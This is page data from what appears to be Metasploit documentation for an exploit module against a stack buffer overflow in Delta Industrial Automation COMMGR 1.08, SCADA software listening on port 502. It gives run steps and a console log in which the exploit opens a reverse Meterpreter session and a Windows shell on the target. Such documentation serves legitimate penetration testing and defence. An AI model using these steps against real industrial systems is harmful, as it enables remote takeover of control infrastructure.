{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/scada/delta_ia_commgr_bof","result":{"data":{"moduleMetadataJson":{"id":"f586208c-31c7-50ae-8668-dffbff47147c","name":"Delta Electronics Delta Industrial Automation COMMGR 1.08 Stack Buffer Overflow","fullname":"exploit/windows/scada/delta_ia_commgr_bof","description":"This module exploits a stack based buffer overflow in Delta Electronics Delta Industrial\n        Automation COMMGR 1.08. The vulnerability exists in COMMGR.exe when handling specially\n        crafted packets. This module has been tested successfully on Delta Electronics Delta\n        Industrial Automation COMMGR 1.08 over\n          Windows XP SP3,\n          Windows 7 SP1, and\n          Windows 8.1.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/scada/delta_ia_commgr_bof","documentationSlug":"/modules/documentation/exploit/windows/scada/delta_ia_commgr_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Delta Electronics Delta Industrial Automation COMMGR 1.08 is affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker to execute arbitrary code. This module has been tested successfully on Windows XP SP3, Windows 7 SP1, and Windows 8.1. The vulnerable application is available for download at <a href=\"http://www.deltaww.com/Products/PluginWebUserControl/downloadCenterCounter.aspx?DID=7763&#x26;DocPath=1&#x26;hl=en-US\">http://www.deltaww.com/Products/PluginWebUserControl/downloadCenterCounter.aspx?DID=7763&#x26;DocPath=1&#x26;hl=en-US</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install Delta Industrial Automation COMMGR 1.08</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/scada/delta_ia_commgr_bof</code></li>\n<li>Do <code class=\"language-text\">set RHOST &lt;target_ip&gt;</code></li>\n<li>Do <code class=\"language-text\">run</code></li>\n<li>You should get a shell. :)</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"delta-industrial-automation-commgr-108-on-windows-7-sp1\" style=\"position:relative;\"><a href=\"#delta-industrial-automation-commgr-108-on-windows-7-sp1\" aria-label=\"delta industrial automation commgr 108 on windows 7 sp1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delta Industrial Automation COMMGR 1.08 on Windows 7 SP1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/scada/delta_ia_commgr_bof\nmsf exploit(windows/scada/delta_ia_commgr_bof) &gt; show options\n\nModule options (exploit/windows/scada/delta_ia_commgr_bof):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  502              yes       The target port (TCP)\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   COMMGR 1.08 / Windows Universal\n\n\nmsf exploit(windows/scada/delta_ia_commgr_bof) &gt; set RHOST 192.168.3.64\nRHOST =&gt; 192.168.3.64\nmsf exploit(windows/scada/delta_ia_commgr_bof) &gt; run\n\n[*] Started reverse TCP handler on 192.168.3.150:4444\n[*] 192.168.3.64:502 - Trying target COMMGR 1.08 / Windows Universal, sending 4601 bytes...\n[*] Sending stage (179779 bytes) to 192.168.3.64\n[*] Meterpreter session 1 opened (192.168.3.150:4444 -&gt; 192.168.3.64:49170) at 2018-09-18 23:38:51 -0700\n\nmeterpreter &gt; sysinfo\nComputer        : TEST01\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; shell\nProcess 932 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Program Files (x86)\\Delta Industrial Automation\\COMMGR 1.08&gt;exit\nexit\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 192.168.3.64 - Meterpreter session 1 closed.  Reason: User exit\nmsf exploit(windows/scada/delta_ia_commgr_bof) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f586208c-31c7-50ae-8668-dffbff47147c"}}}